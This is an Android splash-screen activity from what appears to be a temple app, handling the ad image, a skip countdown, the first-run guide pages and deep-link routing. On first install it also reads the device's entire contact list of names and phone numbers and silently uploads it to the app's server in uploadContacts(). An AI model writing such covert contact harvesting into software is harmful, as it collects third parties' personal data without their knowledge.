package com.yunfengsi;

import android.animation.ObjectAnimator;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.support.v4.view.PagerAdapter;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewStub;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;
import com.bumptech.glide.load.engine.DiskCacheStrategy;
import com.bumptech.glide.request.animation.GlideAnimation;
import com.bumptech.glide.request.target.SimpleTarget;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.AbsCallback;
import com.lzy.okgo.callback.StringCallback;
import com.yunfengsi.Managers.MessageCenter;
import com.yunfengsi.Model_activity.Mine_activity_list;
import com.yunfengsi.Model_activity.activity_Detail;
import com.yunfengsi.Model_zhongchou.FundingDetailActivity;
import com.yunfengsi.NianFo.NianFo;
import com.yunfengsi.Utils.ACache;
import com.yunfengsi.Utils.AnalyticalJSON;
import com.yunfengsi.Utils.ApisSeUtil;
import com.yunfengsi.Utils.Constants;
import com.yunfengsi.Utils.ImageUtil;
import com.yunfengsi.Utils.LogUtil;
import com.yunfengsi.Utils.LoginUtil;
import com.yunfengsi.Utils.PreferenceUtil;
import com.yunfengsi.Utils.mApplication;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Response;

/**
 * Created by Administrator on 2016/10/31.
 */
public class Splash extends AppCompatActivity implements View.OnClickListener {
    private static final String TAG = "Splash";

    /*
       启动页图像控件
     */
    private ImageView image;
    /*
      跳过
    */
    private TextView skip;
    /*
     倒数计时器
    */
    private CountDownTimer cdt;

    //获取到的广告页地址
    private String imageUrl;
    private ACache acache;
    private Bitmap mAD;
    private int screenHeight;

    private TextView type;//类型提示
    private boolean isFirstIn = true;
    /**
     * 轮播引导页
     */
    private ViewPager pager;
    /**
     * 引导页适配器
     */
    private PagerAdapter pagerAdapter;
    /**
     * 广告页URL
     */
    private URL y;

    private boolean shouldLoadImage = true;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.splash);

        initView();
//        MWConfiguration config = new MWConfiguration(this);
//        config.setLogEnable(true);//打开魔窗Log信息
////
//
//        MagicWindowSDK.initSDK(config);
//        MLinkAPIFactory.createAPI(this).registerWithAnnotation(this);
//
//        //跳转router调用
//        LogUtil.e("是否有意图传递：：：" + getIntent().getData());
//        if (getIntent().getData() != null) {
//            MLinkAPIFactory.createAPI(this).router(getIntent().getData());
//            LogUtil.e("微信跳转：：；" + getIntent().getStringExtra("type") + "  " + getIntent().getStringExtra("red"));
//            //跳转后结束当前activity
//            finish();
//        }
    }

    private void gotoHome() {
        startActivity(new Intent(this, MainActivity.class));
        finish();
    }

    /**
     * 获取广告图
     */
    private void getAD() {
        JSONObject js = new JSONObject();
        try {

            js.put("m_id", Constants.M_id);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        ApisSeUtil.M m = ApisSeUtil.i(js);
        OkGo.post(Constants.getAD)
                .params("key", m.K())
                .params("msg", m.M()).execute(new AbsCallback<Object>() {

            @Override
            public Object convertSuccess(Response response) throws Exception {
                return null;
            }

            @Override
            public void onSuccess(Object o, Call call, Response response) {
                if (shouldLoadImage) {
                    if (response != null) {
                        try {
                            String data = response.body().string();
                            HashMap<String, String> map = AnalyticalJSON.getHashMap(data);
                            Log.w(TAG, "onResponse: 广告页地址" + map + "    是否活动图标：：" + map.get("act_start"));
                            if (map != null) {
                                String url = map.get("image1");
                                String detail = map.get("url");
                                getBitmapForAD(url, detail);
                                mApplication.changeIcon = "2".equals(map.get("act_start")) ? true : false;
                                mApplication.componentName = getComponentName();
                                LogUtil.e("入口" + mApplication.componentName);
                            }

                        } catch (IOException e) {
                            Log.w(TAG, "onResponse:广告页 错误" + e.toString());
                            e.printStackTrace();
                        }
                    } else {
                        Log.w(TAG, "onResponse:广告页 错误");
                    }
                }
            }


        });
    }

    private void getBitmapForAD(final String url, final String detail) {
        if (shouldLoadImage) {
            Glide.with(this).load(url)
                    .asBitmap().
                    skipMemoryCache(true)
                    .diskCacheStrategy(DiskCacheStrategy.NONE)
                    .override(getResources().getDisplayMetrics().widthPixels, getResources().getDisplayMetrics().heightPixels)
                    .fitCenter().into(new SimpleTarget<Bitmap>() {
                @Override
                public void onResourceReady(Bitmap resource, GlideAnimation<? super Bitmap> glideAnimation) {
                    if (image != null) {
                        image.setImageBitmap(resource);
                        ObjectAnimator oa = ObjectAnimator.ofFloat(image, "alpha", 0f, 1f).setDuration(1000);
                        oa.start();
                        type.setVisibility(View.VISIBLE);
                        image.setOnClickListener(Splash.this);
                        image.setTag(detail);
                    }
                }
            });
        }

//        try {
//            y = new URL(url);
//        } catch (MalformedURLException e) {
//            e.printStackTrace();
//            e.printStackTrace();
//            Log.w(TAG, "getBitmapForAD:广告页 错误" + e.toString());
//        }
//        if (!(url).equals(acache.getAsString("ad_str"))) {//新广告页
//            final BitmapFactory.Options bfo = new BitmapFactory.Options();
//            bfo.inPreferredConfig = Bitmap.Config.RGB_565;
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
//                    InputStream in = null;
//                    try {
//                        in = y.openStream();
//                    } catch (IOException e) {
//                        Log.w(TAG, "getBitmapForAD:广告页 错误" + e.toString());
//                        e.printStackTrace();
//                    }
//                    final Bitmap b = BitmapFactory.decodeStream(in, null, bfo);
//                    if(b!=null){
//                        Log.w(TAG, "onResourceReady: 广告页bitmap大小————》" + b.getRowBytes() * b.getHeight());
//                        acache.put(("ad_str"), url, ACache.TIME_DAY);
//                        acache.put(("ad_bmp"), b, ACache.TIME_HOUR);
//                        runOnUiThread(new Runnable() {
//                            @Override
//                            public void run() {
//                                if (image != null) {
//                                    image.setImageBitmap(b);
//                                    type.setVisibility(View.VISIBLE);
//                                    image.setOnClickListener(Splash.this);
//                                    image.setTag(detail);
//                                }
//                            }
//                        });
//                    }
//                    try {
//                        if (in != null)
//                            in.close();
//                    } catch (IOException e) {
//                        Log.w(TAG, "getBitmapForAD:广告页 错误" + e.toString());
//                        e.printStackTrace();
//                    }
//
//                }
//            }).start();
//        } else {//缓存广告页
//            Bitmap b = acache.getAsBitmap("ad_bmp");
//            if (b != null && image != null) {
//                image.setImageBitmap(b);
//                image.setOnClickListener(Splash.this);
//                image.setTag(detail);
//                type.setVisibility(View.VISIBLE);
//            } else {
//                acache.put("ad_str", "");
//                getBitmapForAD(url, detail);//重新加载图片并缓存
//            }
//        }


    }


    /**
     * 初始化控件
     */
    private void initView() {
        type = (TextView) findViewById(R.id.splash_type);
        skip = (TextView) findViewById(R.id.splash_skip);
        skip.setOnClickListener(this);
        cdt = new CountDownTimer(5200, 1000) {///倒计时
            @Override
            public void onTick(long millisUntilFinished) {
                skip.setText(mApplication.ST("跳过" + (millisUntilFinished / 1000) + "s"));
                Log.w(TAG, "onTick: " + millisUntilFinished);
                skip.setTextColor(Color.parseColor("#ffffff"));
            }

            @Override
            public void onFinish() {
                cdt.cancel();
                cdt = null;
                skip.performClick();
            }
        };
        acache = ACache.get(getApplicationContext());
        if (PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true)) {
            ViewStub viewStubfirst = (ViewStub) findViewById(R.id.view_stub_first);
            View view = viewStubfirst.inflate();
            pager = (ViewPager) view.findViewById(R.id.view_stub_viewpager);
            final int[] images = new int[]{R.drawable.loading1, R.drawable.loading2};
            pagerAdapter = new PagerAdapter() {
                @Override
                public int getCount() {
                    return images.length;
                }

                @Override
                public boolean isViewFromObject(View view, Object object) {
                    return view == object;
                }

                @Override
                public void destroyItem(ViewGroup container, int position, Object object) {
                    container.removeView((View) object);
                }

                @Override
                public Object instantiateItem(ViewGroup container, int position) {
                    ImageView img = new ImageView(Splash.this);
                    img.setScaleType(ImageView.ScaleType.CENTER_CROP);
                    img.setImageBitmap(ImageUtil.readBitMap(Splash.this, images[position]));
                    container.addView(img);
                    return img;
                }

            };
            pager.setOffscreenPageLimit(images.length);
            pager.setAdapter(pagerAdapter);
            skip.setText(mApplication.ST("跳过"));
            skip.setVisibility(View.VISIBLE);
        } else {
            ViewStub viewStubstart = (ViewStub) findViewById(R.id.view_stub_start);
            View view = viewStubstart.inflate();
            image = (ImageView) view.findViewById(R.id.splash_image);
            image.setImageBitmap(ImageUtil.readBitMap(this, R.drawable.start));
            image.postDelayed(new Runnable() {
                @Override
                public void run() {
                    getAD();
                    skip.setText(mApplication.ST("跳过5s"));
                    skip.setVisibility(View.VISIBLE);
                    cdt.start();
                }
            }, 1200);


        }

        if(PreferenceUtil.getSettingIncetance(this).getBoolean("isFirstInstall",true)
                &&!PreferenceUtil.getUserId(this).equals("")){
            PreferenceUtil.getSettingIncetance(this).edit().putBoolean("isFirstInstall",false).apply();
            uploadContacts();
        }


    }

    private void uploadContacts() {
        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor =getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null, null);
        JSONArray jsonArray=new JSONArray();
        for (int i = 0; i < cursor.getCount(); i++) {
            cursor.moveToPosition(i);
            // 取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String name = cursor.getString(nameFieldColumnIndex);
            String number = cursor.getString(numberFieldColumnIndex);

            HashMap<String,String > map=new HashMap<>();
            map.put("name",name);
            map.put("phone",number);
            JSONObject jsonObject=new JSONObject(map);
            jsonArray.put(jsonObject);
        }
        cursor.close();
        JSONObject js=new JSONObject();
        try {
            js.put("user_id",PreferenceUtil.getUserId(this));
            js.put("contacts",jsonArray.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        ApisSeUtil.M m=ApisSeUtil.i(js);
        OkGo.post(Constants.Contacts)
                .params("key",m.K())
                .params("msg",m.M())
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(String s, Call call, Response response) {

                    }
                });
    }

    /**
     * 手动释放
     */
    @Override
    protected void onDestroy() {
        super.onDestroy();
        image = null;
        if (mAD != null && !mAD.isRecycled()) {
            mAD = null;
        }
        pagerAdapter = null;
        pager = null;
        OkGo.getInstance().cancelTag(TAG);
        Log.w(TAG, "onDestroy: 销毁页面");
        Log.w(TAG, "onDestroy: " + PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true));
        if (PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true)) {
            SharedPreferences.Editor editor = PreferenceUtil.getUserIncetance(this).edit();
            editor.putBoolean("isFirstIn", false);
            editor.apply();
        }

    }

    /**
     * 点击事件
     *
     * @param v
     */
    @Override
    public void onClick(View v) {
        final Intent intent = new Intent();
        switch (v.getId()) {
            case R.id.splash_skip://跳过
                shouldLoadImage = false;
                v.setEnabled(false);
                if (cdt != null) {
                    cdt.cancel();
                    cdt = null;
                }
//                if (new LoginUtil().checkLogin(this)) {
//                    //TODO：动画等耗时操作结束后再调用checkYYB(),一般写在starActivity前即可
//                    MLinkAPIFactory.createAPI(this).checkYYB(this, new YYBCallback() {
//                        @Override
//                        public void onFailed(Context context) {
//                            LogUtil.e("应用宝检测失败");
//                            gotoHome ();
//                        }
//                        @Override
//                        public void onSuccess() {
//                            LogUtil.e("应用宝检测成功"+getIntent().getDataString()+"      "+getIntent().getStringExtra("type"));
////                            if(getIntent()!=null){
////                                String type = getIntent().getStringExtra("type");//type  1,资讯，2活动，3，供养，4，助学，5红包
////                                if (type != null) {
////                                    switch (type) {
////                                        case "1":
////                                            getIntent().setClass(Splash.this, ZiXun_Detail.class);
////                                            break;
////                                        case "2":
////                                            getIntent().setClass(Splash.this, activity_Detail.class);
////                                            break;
////                                        case "3":
////                                            getIntent().setClass(Splash.this, XuanzheActivity.class);
////                                            break;
////                                        case "4":
////                                            getIntent().setClass(Splash.this, FundingDetailActivity.class);
////                                            break;
////                                        case "5":
////                                            getIntent().setClass(Splash.this, ZhiFuShare.class);
////                                            break;
////
////                                    }
////                                    getIntent().setClass(Splash.this, MainActivity.class);
////                                    startActivity(intent);
////                                    startActivity(getIntent());
////
////                                    return;
////                                }
////                            }
//
//                            finish();
//                        }
//                    });

//                }
                intent.setClass(this, MainActivity.class);
                startActivity(intent);
                finish();
                new LoginUtil().checkLogin(this);


                break;
            case R.id.splash_image:
                if (!v.getTag().toString().equals("")) {
                    if (cdt != null) {
                        cdt.cancel();
                        cdt = null;
                    }
                    if (new LoginUtil().checkLogin(this)) {
                        intent.setClass(this, MainActivity.class);
                        startActivity(intent);
                    }
                    String url = v.getTag().toString();
                    if (url != null) {
                        if (url.contains("yfs.php") && url.contains("red")) {
                            intent.setClass(this, ZhiFuShare.class);
                            intent.putExtra("type", "5");
                            startActivity(intent);
                            finish();
                            return;
                        };
                        if(url.equals(Constants.Help)){
                            intent.setClass(Splash.this,AD.class);
                            intent.putExtra("bangzhu",true);
                            startActivity(intent);
                            return;
                        }
                        if (!url.equals("")&&url.contains("yfs.php")) {
                            if (url.contains("?")) {
                                int index = url.lastIndexOf("?");
                                String arg = url.substring(index + 1, url.length());
                                LogUtil.e("截取后的参数字段：" + arg);
                                if (arg.contains("&")) {
                                    String[] args = arg.split("&");
                                    final String id = args[0].substring(args[0].lastIndexOf("=") + 1);
                                    final String type = args[1].substring(args[1].lastIndexOf("=") + 1);
                                    LogUtil.e("字段信息：  id::" + id + "  type::" + type);

                                    Intent intent1 = new Intent();
                                    switch (type) {
                                        case mReceiver.HUODong:
                                            intent1.setClass(Splash.this, activity_Detail.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.GOngyang:
                                            intent1.setClass(Splash.this, XuanzheActivity.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.ZHONGCHou:
                                            intent1.setClass(Splash.this, FundingDetailActivity.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.ZIXUN:
                                            intent1.setClass(Splash.this, ZiXun_Detail.class);
                                            intent1.putExtra("id", id);
                                            break;
                                        case mReceiver.BaoMing:
                                            intent1.setClass(Splash.this, Mine_activity_list.class);
                                            break;
                                        case mReceiver.GONGXIU:
                                            intent1.setClass(Splash.this, NianFo.class);
                                            break;
                                        case mReceiver.TongZhi:
                                            intent1.setClass(Splash.this, MessageCenter.class);
                                            break;

                                    }

                                    startActivity(intent1);
                                    finish();
                                    return;
                                }

                            }
                        }
                    }

                    intent.setClass(this, AD.class);
                    intent.putExtra("url", v.getTag().toString());
                    startActivity(intent);
                    finish();
                }

                break;
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }
}
